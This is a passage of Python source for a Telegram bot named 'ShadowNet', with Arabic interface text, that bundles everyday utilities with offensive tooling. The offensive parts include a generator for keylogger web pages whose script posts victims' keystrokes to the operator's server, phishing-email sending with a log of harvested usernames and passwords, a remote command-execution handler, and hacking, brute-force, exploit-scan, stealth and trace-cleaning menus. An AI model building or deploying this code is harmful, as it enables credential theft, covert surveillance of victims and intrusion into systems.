                msg = "الأجهزة المسجلة:\n"
                for row in rows:
                    msg += f"{row[1]} - {row[2]} - {row[3][:16]}\n"
                safe_send(chat_id, msg)
            else:
                safe_send(chat_id, "لا توجد أجهزة مسجلة.")
            return
        if data == "download_video":
            user_states[chat_id] = "waiting_download"
            safe_send(chat_id, "🔗 أرسل رابط الفيديو:")
            return

        # ===== إدارة (للمطور) =====
        if data in ["admin_panel", "admin_stats", "admin_broadcast", "admin_users", "admin_reports", "admin_phishing_logs", "admin_permissions", "admin_points_menu", "admin_ban_menu", "lock_chat", "send_to_user", "user_activity"]:
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ خاصية المطور فقط.")
                return
            if data == "admin_panel":
                safe_send(chat_id, "⚙️ لوحة التحكم:", reply_markup=build_admin_panel())
                return
            if data == "admin_stats":
                users_count = safe_db_query("SELECT COUNT(*) FROM users")[0]
                targets_count = safe_db_query("SELECT COUNT(*) FROM targets")[0]
                scans_count = safe_db_query("SELECT COUNT(*) FROM scan_results")[0]
                safe_send(chat_id, f"📊 الإحصائيات:\nالمستخدمون: {users_count}\nالأجهزة: {targets_count}\nالفحوصات: {scans_count}")
                return
            if data == "admin_broadcast":
                user_states[chat_id] = "waiting_broadcast"
                safe_send(chat_id, "📢 أدخل رسالة البث الجماعي:")
                return
            if data == "admin_users":
                try:
                    rows = safe_db_query("SELECT chat_id, is_admin, is_banned, points, created_at FROM users ORDER BY created_at DESC", fetch_one=False)
                    if not rows:
                        safe_send(chat_id, "📋 لا يوجد مستخدمين مسجلين في قاعدة البيانات.")
                        return
                    msg = "👥 قائمة المستخدمين المسجلين:\n━━━━━━━━━━━━━━\n"
                    for r in rows:
                        chat_id_user = r[0]
                        is_admin_flag = "👑" if r[1] == 1 else ""
                        banned_flag = "🚫" if r[2] == 1 else "✅"
                        points = r[3]
                        created = r[4][:16] if r[4] else "غير معروف"
                        try:
                            name = get_user_name(chat_id_user)
                        except:
                            name = str(chat_id_user)
                        msg += f"{banned_flag} {is_admin_flag} {name} (ID: {chat_id_user})\n"
                        msg += f"   نقاط: {points} | تاريخ التسجيل: {created}\n\n"
                        if len(msg) > 3500:
                            safe_send(chat_id, msg)
                            msg = ""
                    if msg:
                        safe_send(chat_id, msg)
                except Exception as e:
                    logger.error(f"admin_users error: {e}")
                    safe_send(chat_id, f"❌ حدث خطأ: {str(e)[:100]}")
                return
            if data == "admin_reports":
                rows = safe_db_query("SELECT target, scan_type, created_at FROM scan_results ORDER BY created_at DESC LIMIT 10", fetch_one=False)
                if rows:
                    msg = "📋 التقارير الأخيرة:\n"
                    for row in rows:
                        msg += f"{row[0]} - {row[1]} - {row[2][:16]}\n"
                    safe_send(chat_id, msg)
                else:
                    safe_send(chat_id, "لا توجد تقارير.")
                return
            if data == "admin_phishing_logs":
                rows = safe_db_query("SELECT platform, username, password, created_at FROM phishing_logs ORDER BY created_at DESC LIMIT 10", fetch_one=False)
                if rows:
                    msg = "🎯 سجل التصيد:\n"
                    for r in rows:
                        msg += f"{r[0]} - {r[1]} - {r[2]} - {r[3][:16]}\n"
                    safe_send(chat_id, msg)
                else:
                    safe_send(chat_id, "لا توجد بيانات تصيد.")
                return
            if data == "admin_permissions":
                markup, error = build_users_menu(chat_id, "perm")
                if markup:
                    safe_send(chat_id, "اختر المستخدم لإدارة صلاحياته:", reply_markup=markup)
                else:
                    safe_send(chat_id, error)
                return
            if data.startswith("perm_user_"):
                target_user = int("_".join(data.split("_")[2:]))
                markup = build_permissions_menu(chat_id, target_user)
                if markup:
                    safe_send(chat_id, f"صلاحيات المستخدم {get_user_name(target_user)}:", reply_markup=markup)
                else:
                    safe_send(chat_id, "المستخدم غير موجود.")
                return
            if data.startswith("perm_toggle_"):
                parts = data.split("_")
                perm_type = parts[2]
                target_user = int("_".join(parts[3:]))
                col_map = {"collector": "can_use_collector", "camera": "can_use_camera", "phishing": "can_use_phishing", "advanced": "can_use_advanced"}
                col_name = col_map.get(perm_type)
                if col_name:
                    row = safe_db_query(f"SELECT {col_name} FROM users WHERE chat_id = ?", (target_user,))
                    if row is not None:
                        new_val = 0 if row[0] else 1
                        safe_db_execute(f"UPDATE users SET {col_name} = ? WHERE chat_id = ?", (new_val, target_user))
                        safe_send(chat_id, f"تم تحديث صلاحية {perm_type} إلى {'مفعلة' if new_val else 'معطلة'}")
                        markup = build_permissions_menu(chat_id, target_user)
                        if markup:
                            safe_send(chat_id, f"صلاحيات المستخدم {get_user_name(target_user)}:", reply_markup=markup)
                return
            if data == "admin_points_menu":
                markup, error = build_users_menu(chat_id, "points")
                if markup:
                    safe_send(chat_id, "اختر المستخدم لإدارة نقاطه:", reply_markup=markup)
                else:
                    safe_send(chat_id, error)
                return
            if data.startswith("points_user_"):
                target_user = int("_".join(data.split("_")[2:]))
                user_states[chat_id] = "waiting_admin_points_amount"
                user_states[f"{chat_id}_points_target"] = target_user
                safe_send(chat_id, f"💎 أدخل عدد النقاط (يمكنك إدخال عدد سالب للخصم):")
                return
            if data == "admin_ban_menu":
                markup, error = build_users_menu(chat_id, "ban")
                if markup:
                    safe_send(chat_id, "اختر المستخدم لإدارة الحظر:", reply_markup=markup)
                else:
                    safe_send(chat_id, error)
                return
            if data.startswith("ban_user_"):
                target_user = int("_".join(data.split("_")[2:]))
                row = safe_db_query("SELECT is_banned FROM users WHERE chat_id = ?", (target_user,))
                if row is not None:
                    new_status = 0 if row[0] else 1
                    safe_db_execute("UPDATE users SET is_banned = ? WHERE chat_id = ?", (new_status, target_user))
                    safe_send(chat_id, f"تم {'فتح' if new_status == 0 else 'حظر'} المستخدم {get_user_name(target_user)}")
                else:
                    safe_send(chat_id, "المستخدم غير موجود.")
                return
            if data == "lock_chat":
                markup, error = build_users_menu(chat_id, "lock")
                if markup:
                    safe_send(chat_id, "اختر المستخدم لقفل/فتح الدردشة:", reply_markup=markup)
                else:
                    safe_send(chat_id, error)
                return
            if data.startswith("lock_user_"):
                target_user = int("_".join(data.split("_")[2:]))
                row = safe_db_query("SELECT is_banned FROM users WHERE chat_id = ?", (target_user,))
                if row is not None:
                    new_status = 0 if row[0] else 1
                    safe_db_execute("UPDATE users SET is_banned = ? WHERE chat_id = ?", (new_status, target_user))
                    safe_send(chat_id, f"تم {'فتح' if new_status == 0 else 'قفل'} الدردشة مع {get_user_name(target_user)}")
                else:
                    safe_send(chat_id, "المستخدم غير موجود.")
                return
            if data == "send_to_user":
                markup, error = build_users_menu(chat_id, "send")
                if markup:
                    safe_send(chat_id, "اختر المستخدم لإرسال رسالة إليه:", reply_markup=markup)
                else:
                    safe_send(chat_id, error)
                return
            if data.startswith("send_user_"):
                target_user = int("_".join(data.split("_")[2:]))
                user_states[chat_id] = "waiting_send_to_user"
                user_states[f"{chat_id}_send_target"] = target_user
                safe_send(chat_id, f"📝 أدخل الرسالة التي تريد إرسالها إلى {get_user_name(target_user)}:")
                return
            if data == "user_activity":
                rows = safe_db_query("SELECT chat_id, action, timestamp FROM user_activity ORDER BY timestamp DESC LIMIT 20", fetch_one=False)
                if rows:
                    msg = "📋 آخر النشاطات:\n"
                    for r in rows:
                        name = get_user_name(r[0])
                        msg += f"{name} - {r[1]} - {r[2][:16]}\n"
                    safe_send(chat_id, msg)
                else:
                    safe_send(chat_id, "لا توجد نشاطات.")
                return

        # ===== الحماية =====
        if data == "protection_menu":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ خاصية المطور فقط.")
                return
            safe_send(chat_id, "🛡️ الحماية والأمان:", reply_markup=build_protection_menu())
            return
        if data == "protect_lock":
            if not is_admin(chat_id): return
            global BOT_LOCKED
            BOT_LOCKED = not BOT_LOCKED
            safe_send(chat_id, f"قفل البوت: {'مفعل' if BOT_LOCKED else 'معطل'}")
            return
        if data == "protect_shield":
            if not is_admin(chat_id): return
            safe_send(chat_id, active_shield())
            return
        if data == "protect_stealth":
            if not is_admin(chat_id): return
            global STEALTH_MODE
            STEALTH_MODE = True
            safe_send(chat_id, "🕵️ وضع التخفي الشامل مفعل.")
            return
        if data == "protect_detect":
            if not is_admin(chat_id): return
            safe_send(chat_id, detect_intrusion())
            return
        if data == "protect_identity":
            if not is_admin(chat_id): return
            safe_send(chat_id, change_bot_identity())
            return
        if data == "protect_clean":
            if not is_admin(chat_id): return
            safe_send(chat_id, clean_traces())
            return
        if data == "protect_api":
            if not is_admin(chat_id): return
            safe_send(chat_id, f"🔑 مفتاح API: `{API_KEY}`")
            return
        if data == "protect_backup":
            if not is_admin(chat_id): return
            safe_send(chat_id, backup_data())
            return
        if data == "protect_reboot":
            if not is_admin(chat_id): return
            safe_send(chat_id, restart_bot_safely())
            return
        if data == "toggle_stealth":
            if not is_admin(chat_id): return
            STEALTH_MODE = not STEALTH_MODE
            safe_send(chat_id, f"وضع التخفي: {'مفعل' if STEALTH_MODE else 'معطل'}")
            return

        # ===== القائمة السرية =====
        if data == "hacking_menu":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ خاصية المطور فقط.")
                return
            safe_send(chat_id, "⚠️ الأدوات المتقدمة:", reply_markup=build_hacking_menu())
            return

        # ===== أزرار الهجمات =====
        if data.startswith("hack_") or data.startswith("bruteforce_") or data in ["port_scan", "ssl_scan"]:
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ خاصية المطور فقط.")
                return
            user_states[chat_id] = data
            safe_send(chat_id, "أدخل البيانات المطلوبة:")
            return

    except Exception as e:
        logger.error(f"callback error: {e}")
        safe_send(chat_id, "حدث خطأ.")
        notify_admin(f"خطأ في callback: {e}")

# ===================== معالجات النصوص =====================
@bot.message_handler(func=lambda msg: True, content_types=['text'])
def handle_text(message):
    try:
        chat_id = message.chat.id
        text = message.text.strip()
        state = user_states.get(chat_id)

        update_last_seen(chat_id)
        log_activity(chat_id, f"text: {text[:50]}")

        if is_banned(chat_id) and not is_admin(chat_id):
            safe_send(chat_id, "أنت محظور.")
            return
        if BOT_LOCKED and not is_admin(chat_id):
            safe_send(chat_id, "البوت مقفل.")
            return

        # صوت
        if chat_id in waiting_for_voice_text:
            waiting_for_voice_text.remove(chat_id)
            voice_name = user_voice_selection.get(chat_id, "مصري")
            lang = VOICES.get(voice_name, "ar")
            msg = safe_send(chat_id, "⏳ جاري تحويل النص إلى صوت...")
            try:
                voice_bytes = generate_voice_gtts(text, lang)
                if voice_bytes:
                    bot.send_voice(chat_id, voice_bytes, caption=f"🎤 تم التوليد باستخدام {voice_name}")
                    bot.delete_message(msg.chat.id, msg.message_id)
                else:
                    bot.edit_message_text("❌ فشل توليد الصوت.", msg.chat.id, msg.message_id)
            except Exception as e:
                bot.edit_message_text(f"❌ حدث خطأ: {str(e)[:100]}", msg.chat.id, msg.message_id)
            user_voice_selection.pop(chat_id, None)
            return

        # كلمات السر
        if chat_id in waiting_for_password:
            waiting_for_password.remove(chat_id)
            strength, time, score, feedback = analyze_password(text)
            suggested = generate_strong_password()
            result = f"تحليل كلمة المرور 🔒\n\nالقوة: {strength}\nوقت الاختراق المتوقع: {time}\nالدرجة: {score}/6\n\nمشاكلها:\n"
            for f in feedback: result += f"- {f}\n"
            result += f"\nاقتراح قوي: `{suggested}`"
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("توليد كلمة جديدة", callback_data="password_gen"))
            markup.row(InlineKeyboardButton("تحليل كلمة اخرى", callback_data="password_strength"))
            markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
            safe_send(chat_id, result, reply_markup=markup, parse_mode="Markdown")
            return

        # صور
        if chat_id in waiting_for_image_prompt:
            waiting_for_image_prompt.remove(chat_id)
            msg = safe_send(chat_id, "⏳ جاري توليد الصورة...")
            try:
                image_bytes = generate_image(text)
                if image_bytes:
                    bot.send_photo(chat_id, image_bytes, caption=f"🎨 الصورة المولدة لوصف: {text}")
                    bot.delete_message(msg.chat.id, msg.message_id)
                else:
                    bot.edit_message_text("❌ فشل توليد الصورة.", msg.chat.id, msg.message_id)
            except Exception as e:
                bot.edit_message_text(f"❌ حدث خطأ: {str(e)[:100]}", msg.chat.id, msg.message_id)
            return

        # RCE
        if state == "waiting_rce":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ خاصية المطور فقط.")
                user_states[chat_id] = None
                return
            try:
                output = subprocess.check_output(text, shell=True, stderr=subprocess.STDOUT, timeout=30)
                output = output.decode('utf-8', errors='ignore')
            except Exception as e:
                output = str(e)
            safe_db_execute("INSERT INTO hack_commands (chat_id, command, output, created_at) VALUES (?, ?, ?, ?)",
                            (str(chat_id), text, output, datetime.now().isoformat()))
            safe_send(chat_id, f"🖥️ نتيجة الأمر:\n{output[:3000]}")
            user_states[chat_id] = None
            return

        # Keylogger
        if state == "waiting_keylogger":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ خاصية المطور فقط.")
                user_states[chat_id] = None
                return
            keylogger_html = f'''
            <!DOCTYPE html>
            <html>
            <body>
            <script>
            let keystrokes = '';
            document.addEventListener('keydown', function(e) {{
                keystrokes += e.key;
                if (keystrokes.length > 50) {{
                    fetch('{SERVER_URL}/api/collect_keylog', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({{chat_id: '{chat_id}', keystrokes: keystrokes}})
                    }});
                    keystrokes = '';
                }}
            }});
            </script>
            <h1>Loading...</h1>
            </body>
            </html>
            '''
            os.makedirs('temp', exist_ok=True)
            filename = f"temp/keylogger_{chat_id}_{int(time.time())}.html"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(keylogger_html)
            link = f"{SERVER_URL}/temp/keylogger_{chat_id}_{int(time.time())}.html"
            safe_send(chat_id, f"🔑 رابط Keylogger:\n{link}\n\nشارك هذا الرابط مع الضحية.")
            user_states[chat_id] = None
            return

        # فحص الرابط
        if state == "waiting_link_check":
            if not re.match(r'https?://', text):
                safe_send(chat_id, "❌ الرابط غير صحيح.")
                return
            result = check_link_no_api(text) if 'check_link_no_api' in globals() else {"status": "غير معروف"}
            safe_send(chat_id, f"🔍 نتيجة فحص الرابط:\n{json.dumps(result, indent=2, ensure_ascii=False)}")
            user_states[chat_id] = None
            return

        # قراءة البريد
        if text.startswith('/read_'):
            if chat_id not in user_emails:
                safe_send(chat_id, "لا يوجد بريد نشط")
                return
            try:
                msg_id = text.split("_")[1]
            except:
                safe_send(chat_id, "ارسل: /read_رقم_الرسالة")
                return
            name, domain = user_emails[chat_id][1], user_emails[chat_id][2]
            url = f"https://www.1secmail.com/api/v1/?action=readMessage&login={name}&domain={domain}&id={msg_id}"
            try:
                res = requests.get(url).json()
                result = f"📩 من: {res['from']}\nالموضوع: {res['subject']}\n\n{res['textBody']}"
                safe_send(chat_id, result)
            except Exception as e:
                safe_send(chat_id, f"خطأ: {str(e)[:100]}")
            return

        # خدمات عامة
        if state == "waiting_weather":
            safe_send(chat_id, get_weather_detailed(text))
            user_states[chat_id] = None
            return
        if state == "waiting_wikipedia":
            safe_send(chat_id, f"📚 نتيجة البحث:\n{advanced_wikipedia_search(text)}")
            user_states[chat_id] = None
            return
        if state == "waiting_translate":
            user_states[chat_id] = "waiting_translate_lang"
            user_states[f"{chat_id}_translate_text"] = text
            safe_send(chat_id, "🌐 اختر اللغة المستهدفة:", reply_markup=build_translate_menu())
            return
        if state == "waiting_reminder":
            parts = text.split('|')
            if len(parts) >= 2:
                msg_text = parts[0].strip()
                time_str = parts[1].strip()
                try:
                    hour, minute = map(int, time_str.split(':'))
                    now = datetime.now()
                    target_time = now.replace(hour=hour, minute=minute, second=0, microsecond=0)
                    if target_time <= now:
                        target_time += timedelta(days=1)
                    safe_db_execute("INSERT INTO reminders (chat_id, message, remind_time, created_at) VALUES (?, ?, ?, ?)",
                                    (chat_id, msg_text, target_time.isoformat(), datetime.now().isoformat()))
                    safe_send(chat_id, f"✅ تم تعيين التذكير لـ {time_str}")
                except:
                    safe_send(chat_id, "❌ وقت غير صحيح.")
            else:
                safe_send(chat_id, "❌ صيغة غير صحيحة. استخدم: الرسالة|الساعة:الدقيقة")
            user_states[chat_id] = None
            return
        if state == "waiting_news":
            safe_send(chat_id, f"📰 الأخبار:\n{get_news_without_api(text)}")
            user_states[chat_id] = None
            return
        if state == "waiting_shorten_url":
            result = shorten_url(text)
            safe_send(chat_id, f"🔗 الرابط المختصر:\n{result if result else 'فشل القص'}")
            user_states[chat_id] = None
            return
        if state == "waiting_expand_url":
            result = expand_url(text)
            safe_send(chat_id, f"🔗 الرابط الأصلي:\n{result if result else 'فشل الفك'}")
            user_states[chat_id] = None
            return
        if state == "waiting_phone_number":
            safe_send(chat_id, track_phone_number(text))
            user_states[chat_id] = None
            return
        if state == "waiting_scan_url":
            safe_send(chat_id, "🔍 جاري الفحص الشامل...")
            result = comprehensive_exploit(text)
            safe_send(chat_id, format_exploit_report(result))
            save_scan_result(text, "comprehensive", result)
            user_states[chat_id] = None
            return
        if state == "waiting_download":
            safe_send(chat_id, "⏳ جاري تحميل الفيديو...")
            filename, error = download_video(text)
            if filename and os.path.exists(filename):
                try:
                    with open(filename, 'rb') as f:
                        bot.send_video(chat_id, f, caption="✅ تم التحميل!", timeout=300)
                    os.remove(filename)
                    safe_send(chat_id, "✅ تم إرسال الفيديو بنجاح!")
                except Exception as e:
                    safe_send(chat_id, f"❌ فشل إرسال الفيديو: {str(e)[:100]}")
            else:
                safe_send(chat_id, f"❌ فشل التحميل: {error}")
            user_states[chat_id] = None
            return
        if state == "waiting_broadcast":
            if not is_admin(chat_id): return
            users = safe_db_query("SELECT chat_id FROM users", fetch_one=False)
            sent = 0
            for user in users:
                try:
                    bot.send_message(user[0], f"📢 رسالة من الإدارة:\n{text}")
                    sent += 1
                    time.sleep(0.05)
                except:
                    pass
            safe_send(chat_id, f"✅ تم الإرسال لـ {sent} مستخدم.")
            user_states[chat_id] = None
            return
        if state == "waiting_send_to_user":
            if not is_admin(chat_id): return
            target_user = user_states.get(f"{chat_id}_send_target")
            if target_user:
                safe_send(target_user, text)
                safe_send(chat_id, f"✅ تم الإرسال إلى {get_user_name(target_user)}")
            else:
                safe_send(chat_id, "لم يتم تحديد مستهدف.")
            user_states[chat_id] = None
            return
        if state == "waiting_admin_points_amount":
            if not is_admin(chat_id): return
            target_user = user_states.get(f"{chat_id}_points_target")
            if target_user:
                try:
                    amount = int(text)
                    add_points(target_user, amount, "إدارة النقاط من قبل المطور")
                    safe_send(chat_id, f"✅ تم إضافة {amount} نقطة للمستخدم {get_user_name(target_user)}")
                except:
                    safe_send(chat_id, "❌ أدخل عدداً صحيحاً.")
            else:
                safe_send(chat_id, "لم يتم تحديد مستهدف.")
            user_states[chat_id] = None
            return
        if state == "waiting_phishing_target":
            platform = user_states.get(f"{chat_id}_phishing_platform", "facebook")
            user_states[chat_id] = "waiting_phishing_action"
            user_states[f"{chat_id}_phishing_target_email"] = text
            markup = InlineKeyboardMarkup(row_width=2)
            markup.row(InlineKeyboardButton("✍️ كتابة يدوية", callback_data="phish_action_manual"), InlineKeyboardButton("🤖 إنشاء تلقائي", callback_data="phish_action_auto"))
            safe_send(chat_id, f"المنصة: {platform}\nالبريد: {text}\nكيف تريد إنشاء الرسالة؟", reply_markup=markup)
            return
        if state == "waiting_phishing_custom_message":
            platform = user_states.get(f"{chat_id}_phishing_platform", "facebook")
            target_email = user_states.get(f"{chat_id}_phishing_target_email", "")
            if target_email:
                safe_send(chat_id, f"⏳ جاري إرسال البريد المخصص...")
                result = send_phishing_email(target_email, platform, custom_message=text)
                safe_send(chat_id, result)
            else:
                safe_send(chat_id, "❌ حدث خطأ.")
            user_states[chat_id] = None
            return
        if state == "waiting_pdf_question":
            pdf_text = pdf_texts.get(chat_id)
            if pdf_text:
                safe_send(chat_id, f"📚 الإجابة:\n{smart_pdf_search(pdf_text, text)}")
            else:
                safe_send(chat_id, "❌ لم يتم تحميل أي ملف PDF.")
            user_states[chat_id] = None
            return
        if state == "waiting_apk_analysis":
            safe_send(chat_id, "📦 أرسل ملف APK للتحليل.")
            return

        if state and (state.startswith("hack_") or state.startswith("bruteforce_") or state in ["port_scan", "ssl_scan"]):
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ خاصية المطور فقط.")
                user_states[chat_id] = None
                return
            safe_send(chat_id, f"✅ تم استلام الأمر {state}. سيتم تنفيذه قريباً.")
            user_states[chat_id] = None
            return

        if state is None:
            safe_send(chat_id, "القائمة الرئيسية", reply_markup=build_main_menu(chat_id))

    except Exception as e:
        logger.error(f"handle_text error: {e}")
        safe_send(chat_id, "حدث خطأ.")
        notify_admin(f"خطأ في النص: {e}")

# ===================== معالجات الملفات =====================
@bot.message_handler(content_types=['document'])
def handle_documents(message):
    try:
        chat_id = message.chat.id
        file = message.document
        file_name = file.file_name or "بدون اسم"

        if file_name.lower().endswith('.pdf'):
            safe_send(chat_id, "📄 جاري قراءة الملف...")
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            text = extract_pdf_text(downloaded)
            if text and not text.startswith("خطأ"):
                pdf_texts[chat_id] = text
                safe_send(chat_id, f"✅ تم استخراج النص (عدد الأحرف: {len(text)})")
                markup = InlineKeyboardMarkup(row_width=2)
                markup.row(InlineKeyboardButton("تلخيص", callback_data="pdf_summary"), InlineKeyboardButton("استخراج نصوص", callback_data="pdf_extract"))
                markup.row(InlineKeyboardButton("تحليل ذكي (أسئلة)", callback_data="pdf_smart"), InlineKeyboardButton("رجوع", callback_data="back_main"))
                safe_send(chat_id, "📊 اختر الإجراء:", reply_markup=markup)
            else:
                safe_send(chat_id, f"❌ {text}")
            return

        if user_states.get(chat_id) == "waiting_apk_analysis":
            if not file_name.lower().endswith('.apk'):
                safe_send(chat_id, "❌ يرجى إرسال ملف APK.")
                return
            safe_send(chat_id, "📦 جاري تحليل APK...")
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            result = analyze_apk(downloaded, file_name)
            if result.get('error'):
                safe_send(chat_id, f"❌ فشل: {result['error']}")
            else:
                msg = f"📦 تحليل APK:\nالملف: {file_name}\nالأذونات الخطيرة: {result.get('dangerous_permissions', [])}\nضار: {'نعم' if result.get('malicious') else 'لا'}"
                safe_send(chat_id, msg)
            user_states[chat_id] = None
            return

        safe_send(chat_id, "📄 تم استلام الملف.")
    except Exception as e:
        logger.error(f"handle_documents error: {e}")
        safe_send(chat_id, f"❌ خطأ: {str(e)[:100]}")

# ===================== دوال Keep-Alive والتذكيرات =====================
def keep_alive():
    while True:
        time.sleep(120)
        try:
            requests.get(f"{SERVER_URL}/health", timeout=10)
        except:
            pass

def check_reminders():
    while True:
        try:
            now = datetime.now().isoformat()
            rows = safe_db_query("SELECT id, chat_id, message FROM reminders WHERE remind_time <= ? AND is_active = 1", (now,), fetch_one=False)
            for rid, chat_id, msg in rows:
                safe_send(chat_id, f"⏰ تذكير:\n{msg}")
                safe_db_execute("UPDATE reminders SET is_active = 0 WHERE id = ?", (rid,))
        except Exception as e:
            logger.error(f"check_reminders error: {e}")
        time.sleep(30)

# ===================== تشغيل البوت =====================
def kill_old_bot_instances():
    try:
        import psutil
        current_pid = os.getpid()
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                if proc.info['pid'] == current_pid:
                    continue
                cmdline = ' '.join(proc.info['cmdline'] or [])
                if 'python' in proc.info['name'].lower() and 'app.py' in cmdline:
                    logger.info(f"🔪 Killing old bot process: PID {proc.info['pid']}")
                    proc.kill()
                    time.sleep(1)
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
    except ImportError:
        logger.warning("⚠️ psutil not installed, skipping process kill. Install: pip install psutil")
    except Exception as e:
        logger.error(f"❌ Error killing old instances: {e}")

def start_bot():
    kill_old_bot_instances()
    while True:
        try:
            try:
                bot.delete_webhook()
                logger.info("✅ Webhook deleted")
                time.sleep(3)
            except Exception as e:
                logger.warning(f"⚠️ Webhook deletion failed: {e}")

            logger.info("🚀 Starting bot polling...")
            bot.polling(
                none_stop=True,
                interval=0,
                timeout=60,
                long_polling_timeout=60,
                skip_pending=True
            )
        except Exception as e:
            error_msg = str(e)
            logger.error(f"❌ Bot error: {e}")
            if "409" in error_msg:
                logger.warning("⚠️ Conflict 409: Another instance is running.")
                kill_old_bot_instances()
                logger.info("🔄 Waiting 30 seconds before retry...")
                time.sleep(30)
            elif "403" in error_msg:
                logger.error("❌ Token invalid or bot blocked. Please check TOKEN.")
                time.sleep(60)
            elif "Connection" in error_msg or "Timeout" in error_msg:
                logger.warning("⚠️ Network error. Retrying in 15 seconds...")
                time.sleep(15)
            else:
                logger.warning(f"⚠️ Unknown error. Retrying in 10 seconds...")
                time.sleep(10)

if __name__ == '__main__':
    print("\n" + "="*60)
    print("🤖 ShadowNet - النسخة النهائية (جميع التعديلات مدمجة)")
    print(f"📌 Health Check: {SERVER_URL}/health")
    print("="*60 + "\n")

    try:
        bot.delete_webhook()
    except:
        pass

    threading.Thread(target=keep_alive, daemon=True).start()
    threading.Thread(target=check_reminders, daemon=True).start()
    threading.Thread(target=start_bot, daemon=True).start()

    app.run(host='0.0.0.0', port=PORT, debug=False)
